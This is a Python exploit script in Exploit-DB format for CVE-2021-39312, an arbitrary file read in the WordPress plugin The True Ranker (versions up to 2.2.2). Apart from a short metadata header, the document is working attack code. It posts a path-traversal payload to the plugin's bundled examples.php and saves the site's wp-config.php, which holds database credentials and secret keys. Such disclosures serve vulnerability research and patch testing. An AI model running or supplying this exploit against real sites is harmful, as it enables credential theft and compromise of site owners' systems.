# Exploit Title: WordPress Plugin The True Ranker 2.2.2 - Arbitrary File Read
# Vendor Homepage: https://wordpress.org/plugins/seo-local-rank/
# Software Link: https://plugins.svn.wordpress.org/seo-local-rank/tags/2.2.2/
# Version: versions <= 2.2.2
# Tested on: Linux 
# CVE: CVE-2021-39312

#Exploit Usage: python exploit.py -u "http://127.0.0.1"

import argparse, textwrap
import requests

parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)                     
group_must = parser
group_must.add_argument("-u","--url",required=True) 
parser.add_argument("--payload",default="../../../../../../../../../../wp-config.php",required=False) 

args = parser.parse_args()
HOST = args.url
PAYLOAD = args.payload

url = "{}/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php".format(HOST)
payload = "/scripts/simple.php/{}".format(PAYLOAD)


r = requests.post(url,data={'src': payload})
if r.status_code == 200:

	f = open("wp-config.php", "w")
	f.write(str(r.text))
else:
  print("site is not vulnerable")
